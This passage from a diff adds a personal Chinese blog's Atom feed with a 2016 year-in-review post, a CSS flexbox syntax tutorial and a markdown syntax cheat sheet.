+                &lt;div class=&quot;image-caption&quot;&gt;一张图&lt;/div&gt;
+            &lt;/figure&gt; --&gt;
+&lt;img src=&quot;http://oi9jazeov.bkt.clouddn.com/DP-170611-1.jpg&quot; width=&quot;600px&quot;&gt;
+
+&lt;p&gt;哈哈，时间过得真快啊！（果然一开篇就是这种套话）。恩…看了一下上一篇博客竟然是上学期最后一天写的，到现在已经九个月了！！！&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="生活" scheme="https://luckyjq.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>我的2016</title>
+    <link href="https://luckyjq.github.io/2016/12/30/%E6%88%91%E7%9A%842016/"/>
+    <id>https://luckyjq.github.io/2016/12/30/我的2016/</id>
+    <published>2016-12-30T11:59:45.000Z</published>
+    <updated>2018-02-22T07:22:19.948Z</updated>
+    
+    <content type="html"><![CDATA[<p>沈小祺的2016</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=694286&auto=0&height=66"></iframe><p>时间过得真的很快，转眼之间已经站在2016的最后一天了。昨天还跟室友调侃，要不要写个年终总结之类的。中午无聊打开了自己的空间，看了看自己以前写的东西，讲真，虽然有那么点恶心，但是，留给自己更多的还是感动。所以，还是来写一写沈健祺的这一年吧，讲真，我也想知道自己这一年到底干了些什么。</p><a id="more"></a><p>先来看看我15年末也就是大一上的时候列下的愿望清单吧，要不是翻了翻以前的日志，我还真不知道我自己竟然还写过这种东西。</p><p>▼</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/%E6%84%BF%E6%9C%9B%E6%B8%85%E5%8D%95.png" alt="愿望清单" title>                </div>                <div class="image-caption">愿望清单</div>            </figure><p>2016年，好像这些愿望都实现了。只是第六点，“去一个想去的地方，和他们一起”。【和他们一起】，当时我写下这个的时候，想的是谁呢？</p><p>我试着去回忆2016让我印象特别深刻的事情，可我却发现，可以说找不到？或者说感觉蛮多事都满印象深刻的所以便算不上深刻了？我大概是一个健忘的人，我妈跟我讲的话转身就忘了，初中、高中的记忆也留下不多，我不是一个爱怀念的人。</p><p>我的2016，当了社联的一个小部长，有了几个自己的小部员，我还记得当初自己争取当部长的时候自己说过的话，“我想有一个自己的团队，我想锻炼自己的能力”，只是现在看来，我对这帮孩子更多的是亏欠，想的永远和做的有差距，但是请一定要记住自己说过什么，许下过什么承诺。</p><p>我的2016，做了大概有100+左右的微信推送，但大多只是活动或者通知类的，自己真正满意的不会超过一只手。下学期的宣传工作该如何进行，好好想想吧。</p><p>我的2016成绩一般般，中等偏上一点，拿了两次B等奖学金，作业教的次数不多，大概是越来越浪了吧。不要抱怨什么班级学习氛围不好，想不想好好读书永远是你自己的事情，只是，如何定义好好读书这四个字？</p><p>我的2016和初中朋友去了苏州和上海，行程匆匆，没有来得及看太多风景；和室友在国庆去了趟北京，买票晚了做了16个小时的硬座。</p><p>我的2016入门了java，学习了前端，感谢学长建立的学习圈，让一圈有共同爱好的人可以相互督促，相互学习。</p><p>我的2016，寒假给一个初中生补了几天课，赚了几百块钱，可以真正算是认识第一桶金吧，虽然我在小学的时候就开始做五毛钱30张卡片的生意了。暑假当了个队长，和七八个做了一次暑期实习，剪纸，皮影，陶艺，中华传统文化魅力无穷。</p><p>还有参加了这学期的迎新工作，每天暴走三四万步；和社联的小伙伴们一起来了次别墅行，嗨了一个晚上；终于拥有了自己的第一部微单，虽然还没有怎么好好玩过；大概还有几次聚餐，几次考试的焦虑，几百盘撸啊撸的开黑岁月吧，还有……应该还有还有好些事情吧，只是记不太清了。</p><p>再见了，2016。<br>你好啊，2017。<br>珍惜时光，生活加油。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;沈小祺的2016&lt;/p&gt;
+&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=694286&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;时间过得真的很快，转眼之间已经站在2016的最后一天了。昨天还跟室友调侃，要不要写个年终总结之类的。中午无聊打开了自己的空间，看了看自己以前写的东西，讲真，虽然有那么点恶心，但是，留给自己更多的还是感动。所以，还是来写一写沈健祺的这一年吧，讲真，我也想知道自己这一年到底干了些什么。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="生活" scheme="https://luckyjq.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>flex布局语法</title>
+    <link href="https://luckyjq.github.io/2016/12/21/flex%E5%B8%83%E5%B1%80%E8%AF%AD%E6%B3%95/"/>
+    <id>https://luckyjq.github.io/2016/12/21/flex布局语法/</id>
+    <published>2016-12-21T13:14:38.000Z</published>
+    <updated>2018-02-22T07:22:45.502Z</updated>
+    
+    <content type="html"><![CDATA[<p>Flex是Flexible Box的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。<br>任何一个容器都可以指定为Flex布局。</p><ul><li>Webkit内核的浏览器，必须加上-webkit前缀。</li><li>注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。</li></ul><a id="more"></a><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h2><p>采用Flex布局的元素，称为Flex容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为Flex项目（flex item），简称”项目”。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://oi9jazeov.bkt.clouddn.com/flex.png" alt="flex布局图" title>                </div>                <div class="image-caption">flex布局图</div>            </figure><h2 id="2-容器的属性"><a href="#2-容器的属性" class="headerlink" title="2.容器的属性"></a>2.容器的属性</h2><ul><li>flex-direction:决定主轴的方向（即项目的排列方向）<ul><li>row（默认值）：主轴为水平方向，起点在左端。</li><li>row-reverse：主轴为水平方向，起点在右端。</li><li>column：主轴为垂直方向，起点在上沿。</li><li>column-reverse：主轴为垂直方向，起点在下沿。</li></ul></li><li>flex-wrap:flex-wrap属性定义，如果一条轴线排不下，如何换行<ul><li>nowrap（默认）：不换行</li><li>wrap：换行，第一行在上方</li><li>wrap-reverse：换行，第一行在下方</li></ul></li><li>flex-flow:flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap</li><li>justify-content:定义了项目在主轴上的对齐方式<ul><li>flex-start（默认值）：左对齐</li><li>flex-end：右对齐</li><li>center： 居中</li><li>space-between：两端对齐，项目之间的间隔都相等。</li><li>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://www.ruanyifeng.com/blogimg/asset/2015/bg2015071010.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul></li><li>align-items:align-items属性定义项目在交叉轴上如何对齐<ul><li>flex-start：交叉轴的起点对齐。</li><li>flex-end：交叉轴的终点对齐。</li><li>center：交叉轴的中点对齐。</li><li>baseline: 项目的第一行文字的基线对齐。</li><li>stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://www.ruanyifeng.com/blogimg/asset/2015/bg2015071011.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul></li><li>align-content:定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用</li></ul><h2 id="3-项目的属性"><a href="#3-项目的属性" class="headerlink" title="3.项目的属性"></a>3.项目的属性</h2><ul><li>order：定义项目的排列顺序。数值越小，排列越靠前，默认为0<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://www.ruanyifeng.com/blogimg/asset/2015/bg2015071013.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>flex-grow：定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大<ul><li>如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://www.ruanyifeng.com/blogimg/asset/2015/bg2015071014.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul></li><li>flex-shrink：定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小<ul><li>如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://www.ruanyifeng.com/blogimg/asset/2015/bg2015071015.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul></li><li>flex-basis：定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小<ul><li>它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间</li></ul></li><li>flex：是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选<ul><li>该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)</li></ul></li><li>align-self：align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch<ul><li>auto</li><li>flex-start</li><li>flex-end</li><li>center</li><li>baseline</li><li>stretch</li></ul></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Flex是Flexible Box的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。&lt;br&gt;任何一个容器都可以指定为Flex布局。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Webkit内核的浏览器，必须加上-webkit前缀。&lt;/li&gt;
+&lt;li&gt;注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="css3" scheme="https://luckyjq.github.io/tags/css3/"/>
+    
+      <category term="flex" scheme="https://luckyjq.github.io/tags/flex/"/>
+    
+      <category term="布局" scheme="https://luckyjq.github.io/tags/%E5%B8%83%E5%B1%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>markdown语法</title>
+    <link href="https://luckyjq.github.io/2016/12/20/markdown%E8%AF%AD%E6%B3%95/"/>
+    <id>https://luckyjq.github.io/2016/12/20/markdown语法/</id>
+    <published>2016-12-20T13:19:42.000Z</published>
+    <updated>2018-02-22T07:22:37.675Z</updated>
+    
+    <content type="html"><![CDATA[<p>非常简单方便的文本标记语言，基本上几分钟就能掌握。</p><h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><ul><li># 代表一级标题，## 代表二级标题，以此类推，###### 六级标题</li><li>- 代表无序列表</li><li>&gt; 代表引用，如下面（结束引用要前后都有空行）</li></ul><a id="more"></a><ul><li>如果要显示代码，使用如下写法</li></ul><blockquote><p>``` css(语言名称)<br>代码内容<br>代码内容<br>```</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;<span class="attribute">width</span>:<span class="number">100px</span>;&#125;</span><br></pre></td></tr></table></figure><ul><li>*** 代表分割线</li><li>*text* 代表斜体</li><li>**text** 代表加粗</li><li>![text](URL) 插入图片的样式</li><li>[link](URL) 链接的样式</li><li>\ 表示转义字符</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;非常简单方便的文本标记语言，基本上几分钟就能掌握。&lt;/p&gt;
+&lt;h3 id=&quot;常用语法&quot;&gt;&lt;a href=&quot;#常用语法&quot; class=&quot;headerlink&quot; title=&quot;常用语法&quot;&gt;&lt;/a&gt;常用语法&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;# 代表一级标题，## 代表二级标题，以此类推，###### 六级标题&lt;/li&gt;
+&lt;li&gt;- 代表无序列表&lt;/li&gt;
+&lt;li&gt;&amp;gt; 代表引用，如下面（结束引用要前后都有空行）&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="markdown" scheme="https://luckyjq.github.io/tags/markdown/"/>
+    
+  </entry>
+  
+</feed>
